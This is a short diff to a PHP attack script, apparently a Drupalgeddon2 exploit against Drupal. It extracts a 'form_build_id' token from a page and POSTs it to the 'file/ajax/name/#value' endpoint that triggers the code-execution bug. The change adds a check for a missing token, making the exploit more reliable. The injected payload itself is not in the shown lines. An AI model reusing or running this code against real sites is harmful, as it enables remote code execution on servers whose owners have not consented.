@@ -81,10 +81,15 @@
 			@$dom->loadHTML($result);
 			$xp = new DOMXpath($dom);
 			$input_tags = $xp->query('//input[@name="form_build_id"]');
-			$token = $input_tags->item(0)->getAttribute('value');
-			curl_setopt($curl, CURLOPT_URL, $uri.'/?q=file%2Fajax%2Fname%2F%23value%2F'.$token);
-			curl_setopt($curl, CURLOPT_POSTFIELDS, 'form_build_id='.$token);
-			$result = curl_exec($curl);
+			$token = $input_tags->item(0);
+			if(!empty($token)):
+				$token = $token->getAttribute('value');
+				curl_setopt($curl, CURLOPT_URL, $uri.'/?q=file%2Fajax%2Fname%2F%23value%2F'.$token);
+				curl_setopt($curl, CURLOPT_POSTFIELDS, 'form_build_id='.$token);
+				$result = curl_exec($curl);
+			else:
+				echo '[*] Empty token'.PHP_EOL;
+			endif;
 		endif;
 		if(curl_errno($curl)):
 			echo 'ERROR DEBUG'.PHP_EOL;
